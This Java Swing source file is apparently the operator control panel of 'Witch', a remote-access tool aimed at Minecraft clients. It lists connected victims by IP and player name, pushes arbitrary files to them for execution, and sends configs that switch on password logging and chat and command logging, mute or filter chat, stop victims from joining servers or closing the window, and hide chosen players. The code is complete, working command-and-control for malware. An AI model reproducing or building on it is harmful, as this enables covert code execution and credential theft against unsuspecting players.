package me.soda.witch.server.gui;

import me.soda.witch.server.server.Server;
import me.soda.witch.server.utils.Utils;
import me.soda.witch.shared.socket.Connection;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.ClientConfigData;
import me.soda.witch.shared.socket.messages.messages.DisconnectData;
import net.miginfocom.swing.MigLayout;

import javax.swing.*;
import javax.swing.border.LineBorder;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class AdminPanel extends JPanel {
    public final DefaultTableModel connTableModel;
    public final JTextArea console;
    private final List<Integer> selectedConns = new ArrayList<>();
    private final Server server;
    private final JTable table;
    private final JPopupMenu menu = new JPopupMenu() {{
        addPopupMenuListener(new PopupMenuListener() {
            @Override
            public void popupMenuWillBecomeVisible(PopupMenuEvent e) {
                selectedConns.clear();
                int[] i = table.getSelectedRows();
                for (int i1 : i) {
                    selectedConns.add((Integer) table.getValueAt(i1, 0));
                }
            }

            @Override
            public void popupMenuWillBecomeInvisible(PopupMenuEvent e) {
            }

            @Override
            public void popupMenuCanceled(PopupMenuEvent e) {
            }
        });


        JMenuItem disconnect = new JMenuItem("Disconnect");
        disconnect.addActionListener(e -> getConns().forEach(connection -> connection.close(DisconnectData.Reason.NOREC)));

        JMenuItem reconnect = new JMenuItem("Reconnect");
        reconnect.addActionListener(e -> getConns().forEach(connection -> connection.close(DisconnectData.Reason.RECONNECT)));

        JMenuItem execute = new JMenuItem("Execute");
        execute.addActionListener(e -> {
            JFileChooser fileChooser = new JFileChooser();
            if (fileChooser.showOpenDialog(this) == JFileChooser.APPROVE_OPTION) {
                try (FileInputStream is = new FileInputStream(fileChooser.getSelectedFile())) {
                    byte[] data = is.readAllBytes();
                    getConns().forEach(connection -> connection.send(Message.fromBytes("execute", data)));
                } catch (IOException ex) {
                    JOptionPane.showConfirmDialog(this, ex.getMessage(), "Error", JOptionPane.DEFAULT_OPTION, JOptionPane.ERROR_MESSAGE);
                }
            }
        });

        JMenuItem config = new JMenuItem("Config");
        config.addActionListener(e -> {
            JDialog dialog = new JDialog();
            ClientConfigData cfg = Utils.getDefaultClientConfig();
            JCheckBox passwordBeingLogged = new JCheckBox("Log password", cfg.passwordBeingLogged);
            JCheckBox isMuted = new JCheckBox("Mute", cfg.isMuted);
            JCheckBox isBeingFiltered = new JCheckBox("Filter", cfg.isBeingFiltered);
            JTextField filterPattern = new JTextField(cfg.filterPattern);
            JCheckBox logChatAndCommand = new JCheckBox("Log chat and command", cfg.passwordBeingLogged);
            JCheckBox canJoinServer = new JCheckBox("Can join server", cfg.passwordBeingLogged);
            JCheckBox canQuitServerOrCloseWindow = new JCheckBox("Can quit server or close window", cfg.passwordBeingLogged);
            JTextArea invisiblePlayers = new JTextArea();
            cfg.invisiblePlayers.forEach(p -> invisiblePlayers.append(p + "\n"));
            JButton send = new JButton("send");
            send.addActionListener(e1 -> {
                cfg.passwordBeingLogged = passwordBeingLogged.isSelected();
                cfg.isMuted = isMuted.isSelected();
                cfg.isBeingFiltered = isBeingFiltered.isSelected();
                cfg.filterPattern = filterPattern.getText();
                cfg.logChatAndCommand = logChatAndCommand.isSelected();
                cfg.canJoinServer = canJoinServer.isSelected();
                cfg.canQuitServerOrCloseWindow = canQuitServerOrCloseWindow.isSelected();
                cfg.invisiblePlayers = Arrays.stream(invisiblePlayers.getText().split("\n")).map(s -> s.replace("\r", "")).toList();
                getConns().forEach(connection -> connection.send(new Message(cfg)));
                dialog.dispose();
            });

            dialog.setLayout(new MigLayout());
            dialog.add(passwordBeingLogged, "wrap");
            dialog.add(isMuted, "wrap");
            dialog.add(isBeingFiltered, "wrap");
            dialog.add(new JLabel("Filter pattern"), "split 2");
            dialog.add(filterPattern, "wrap, growx");
            dialog.add(logChatAndCommand, "wrap");
            dialog.add(canJoinServer, "wrap");
            dialog.add(canQuitServerOrCloseWindow, "wrap");
            dialog.add(new JLabel("Invisible players"), "split 2");
            dialog.add(invisiblePlayers, "wrap, growx");
            dialog.add(send);
            dialog.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
            dialog.setResizable(false);
            dialog.pack();
            dialog.setLocationRelativeTo(null);

            dialog.setVisible(true);
        });


        add(disconnect);
        add(reconnect);
        add(execute);
        add(config);
    }};

    public AdminPanel(Server server) {
        this.server = server;
        setLayout(new MigLayout());

        String[] columnNames = new String[]{"ID", "IP", "Player"};
        connTableModel = new DefaultTableModel(new Object[][]{}, columnNames) {
            @Override
            public boolean isCellEditable(int row, int column) {
                return false;
            }
        };

        table = new JTable(connTableModel);
        table.setComponentPopupMenu(menu);

        JScrollPane scrollTbl = new JScrollPane(table);

        add(scrollTbl, "wrap, pushx, growx");

        console = new JTextArea("Witch Server Console\n") {
            @Override
            public void append(String str) {
                str += "\n";
                super.append(str);
            }
        };
        console.setRows(10);
        console.setLineWrap(true);
        console.setBackground(Color.DARK_GRAY);
        console.setForeground(Color.WHITE);
        console.setBorder(LineBorder.createGrayLineBorder());
        console.setEditable(false);

        JScrollPane scrollTxt = new JScrollPane(console);
        add(scrollTxt, "wrap, pushx, growx");
    }

    private List<Connection> getConns() {
        return server.getConnections().stream().filter(conn -> selectedConns.contains(server.clientMap.get(conn).id)).toList();
    }
}
